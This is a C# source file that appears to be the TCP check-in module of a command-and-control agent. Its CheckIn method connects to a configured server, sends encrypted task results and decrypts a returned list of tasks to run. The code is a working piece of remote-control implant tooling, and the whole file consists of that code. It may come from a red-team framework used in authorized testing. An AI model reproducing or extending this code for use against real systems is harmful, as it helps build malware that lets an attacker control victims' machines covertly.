using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Helpers;
using System.Security.Cryptography;
using System.Diagnostics;

namespace Agent.Communication
{
    public class TcpCommModule : Communicator
    {
        public TcpCommModule(ConnexionUrl conn) : base(conn)
        {
        }


        protected override async Task<List<MessageTask>> CheckIn(List<MessageResult> results)
        {
            var client = new TcpClient(this.Connexion.Address, this.Connexion.Port);

            if (!client.IsAlive())
                return null;

            client.SendMessage(this.Encryptor.Encrypt(results.Serialize()));

            var responseContent = client.ReceivedMessage(true);
            var dec = this.Encryptor.Decrypt(responseContent);
            return dec.Deserialize<List<MessageTask>>();
        }
    }
}
